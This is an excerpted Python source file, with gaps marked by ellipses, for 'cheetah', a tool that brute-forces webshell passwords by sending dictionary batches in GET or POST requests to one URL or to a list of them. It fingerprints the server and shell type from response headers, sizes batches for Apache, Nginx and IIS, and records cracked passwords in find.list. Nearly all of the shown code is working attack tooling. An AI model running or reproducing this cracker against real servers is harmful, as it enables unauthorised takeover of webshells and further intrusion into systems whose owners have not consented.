...
try:
    with open('user-agent.list') as agent_file:
...
def process_pwd_file(options):
    for i in range(len(options.pwd_file_list)):
        print_highlight('[INFO] removing duplicate rows in password file '+options.pwd_file_list[i])
        new_file_name = 'solved_'+ options.pwd_file_list[i]
        with open(new_file_name, 'a') as new_file:
            for chunk in read_chunks(options.pwd_file_list[i]):
                new_file.write('\n'.join(set(chunk.split())).lower())
        print_highlight('[HINT] the duplicate rows in '+options.pwd_file_list[i]+' file have been removed')
...
def req_get(payload, times, options):
    ...
    try:
        r = requests.get(url=options.url, headers=header, params=payload, timeout=10)
    except Exception as e:
        print_highlight('[ERROR] '+ str(e))
    ...
    if r.status_code in range(200, 300):
        print_highlight('[INFO] the web server responds successfully')
        if r.text in payload:
            print(white +get_time()+'[HINT] the password of '+options.url+' is '+reset+red+r.text+reset)
            with open('find.list', 'a') as find_file:
                find_file.write(options.url+'\t\t'+r.text+'\n')
            print_highlight('[HINT] the password has been written to find.list file')
            return 'find'
        else:
            if options.verbose:
...
def req_post(payload, times, options):
    ...
    if r.status_code == 404:
        print_highlight('[ERROR] the web server '+options.url+' response code: '+str(r.status_code))
        print_highlight('[WARN] maybe the request url incorrect')
        print_highlight('[HINT] try to check the url: '+options.url)
        return 'error'
    ...
    if r.status_code in range(200, 300):
        ...
        if r.text in payload:
            ...
            with open('find.list', 'a') as find_file:
                find_file.write(options.url+'\t\t'+r.text+'\n')
            print_highlight('[HINT] the password of has been written to find.list file')
            return 'find'
        else:
            if options.verbose:
                print_highlight('[INFO] the password of '+options.url+' not in '+str(times)+' th group payload')
...
def detect_web(options):
    print_highlight('[WARN] you did not specify the web server or shell type')
    ...
    if options.shell_type == 'auto-detect':
    ...
    if options.web_server == 'auto-detect' or options.shell_type == 'auto-detect':
        try:
        ...
        if 'server' in get_rsp.headers:
            print_highlight('[HINT] the web server may be '+get_rsp.headers['server'])
            options.web_server = get_rsp.headers['server'].lower()

        if 'x-powered-by' in get_rsp.headers:
            print_highlight('[HINT] the web server may be x-powered-by '+get_rsp.headers['x-powered-by'])
            if options.shell_type == 'auto-detect':
                for shell_type in shell_type_list:
                    if shell_type in get_rsp.headers['x-powered-by'].lower():
                        print_highlight('[HINT] the shell type may be '+shell_type)
                        options.shell_type = shell_type
                        break
            if options.web_server == 'auto-detect':
...
def set_max_req(options):
    if options.max_request == None:
        print_highlight('[WARN] you did not specify the maximum request parameter')
        web_server_dict = {'apache':{'post':1000, 'get':100}, 'nginx':{'post':1000, 'get':756}, 'iis':{'post':4891, 'get':45}}
        for web_server in web_server_dict:
            if web_server in options.web_server:
                print_highlight('[INFO] the web server '+options.web_server+' '+options.req_type+' request default setting '+str(web_server_dict[web_server][options.req_type]))
                options.max_request = web_server_dict[web_server][options.req_type]
                break
...
def dict_attack(options):
    ...
    for pwd_file_name in options.pwd_file_list:
        ...
        try:
            ...
            print_highlight('[INFO] the cheetah end execution')
            exit(1)
        print_highlight('[HINT] you are using password file '+pwd_file_name)
...
use examples:
  ...
  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v''')
    ...
    parser.add_argument('-w', '--webshell', default='auto-detect', dest='shell_type',
        choices=['PHP','php','ASP','asp', 'ASPX','aspx', 'JSP','jsp'], 
        help="specify webshell type(default auto-detect)", metavar='')
    parser.add_argument('-s', '--server', default='auto-detect', dest='web_server',
        choices=['Apache','apache','Nginx','nginx','IIS','iis'], 
        help="specify web server name(default auto-detect)", metavar='')
    parser.add_argument('-n', '--number', type=int, dest='max_request', metavar='',
    ...
    #     help='specify to enable batch webshell urls cracking')
    parser.add_argument('-b', '--url-file', dest='url_file', metavar='',
        help='specify batch webshell urls file')
    parser.add_argument('-p', nargs='+', default='pwd.list', dest='pwd_file_list',
        help='specify possword file(default pwd.list)', metavar='FILE')
    options = parser.parse_args()

    if options.update:
        abs_dir = os.path.dirname(os.path.abspath(__file__))
        if os.path.exists(os.path.join(abs_dir,'.git')) == True:
            print('[*] hint: try use "git pull origin master" to update cheetah')
            exit(0)

        if os.path.isfile(os.path.join(abs_dir,'update.py')) == False:
            print('[!] error: can not find file update.py')
            print('[*] hint: try to use "git clone '+__github__+'.git" to update cheetah')
            print('[*] hint: try to open link '+__github__+'in browser to download latest cheetah')
            exit(0)
        else:
    ...
    if options.url == None and options.url_file == None:
    ...
    if options.verbose:
        print_highlight('[INFO] you are using verbose mode')
    if options.remove:
        process_pwd_file(options)
    if options.req_type == 'post':
        print_highlight('[HINT] you are using POST request mode')
    if options.req_type == 'get':
        print_highlight('[HINT] you are using GET request mode')
    if options.url != None:
        print_highlight('[HINT] you are using dictionary-based password attack mode')
        print_highlight('[INFO] cracking webshell password of '+options.url)
        attack_res = dict_attack(options)
    if options.url_file != None:
        print_highlight('[HINT] you are using batch cracking mode')
        ...
        try:
            ...
            print_highlight('[INFO] the cheetah end execution')
            exit(1)
        print_highlight('[INFO] you are using urls file '+options.url_file)
        print_highlight('[HINT] you are using dictionary-based password attack mode')
